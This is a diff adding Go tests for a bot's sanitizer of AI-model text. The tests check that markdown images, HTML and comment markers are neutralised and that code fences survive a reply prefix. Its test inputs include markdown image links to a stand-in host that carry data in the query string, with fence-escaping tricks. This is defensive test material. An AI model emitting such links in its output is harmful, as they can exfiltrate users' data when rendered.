@@ -81,8 +81,39 @@ func TestSanitizeModelText(t *testing.T) {
 			t.Errorf("%s:\n got %q\nwant %q", name, got, c.want)
 		}
 	}
-	if got := sanitizeModelLine("Two\nlines   <img src=x>"); got != "Two lines &lt;img src=x>" {
-		t.Errorf("sanitizeModelLine = %q", got)
+	// Inputs from review of this sanitizer: none may leave an image active.
+	for _, in := range []string{
+		"```bad`info\n![x](https://evil.example/p?d=S)",
+		"`\n\n![x](https://evil.example/p?d=S)\n\n`",
+		"\\`![x](https://evil.example/p?d=S)`",
+	} {
+		if got := sanitizeModelText(in); strings.Contains(got, "![") {
+			t.Errorf("sanitizeModelText(%q) = %q, image still active", in, got)
+		}
+	}
+
+	for in, want := range map[string]string{
+		"Two\nlines   <img src=x>":     "Two lines &lt;img src=x>",
+		"~~~ ![x](https://evil/p?d=S)": "~~~ [x](https://evil/p?d=S)", // after a prefix, never a fence
+		"Uses `List<T>` <!-- prbot:x":  "Uses `List<T>` &lt;!-- prbot\u200b:x",
+	} {
+		if got := sanitizeModelLine(in); got != want {
+			t.Errorf("sanitizeModelLine(%q) = %q, want %q", in, got, want)
+		}
+	}
+}
+
+// Model text that opens with a fence stays a fence after the bot's prefix.
+func TestAfterPrefix(t *testing.T) {
+	for _, c := range []struct{ text, want string }{
+		{"Thanks, fixed.", "@a Thanks, fixed."},
+		{"~~~ ![x](u)\ncode\n~~~", "@a\n\n~~~ ![x](u)\ncode\n~~~"},
+		{"```go\nx\n```", "@a\n\n```go\nx\n```"},
+		{"```a`b\nx", "@a ```a`b\nx"}, // not a fence anyway (and its lines were cleaned)
+	} {
+		if got := afterPrefix("@a", c.text); got != c.want {
+			t.Errorf("afterPrefix(%q) = %q, want %q", c.text, got, c.want)
+		}
 	}
 	if got := sanitizeModelText(strings.Repeat("x", 3*maxModelBody)); len(got) > maxModelBody+len("…") {
 		t.Errorf("not capped: %d bytes", len(got))
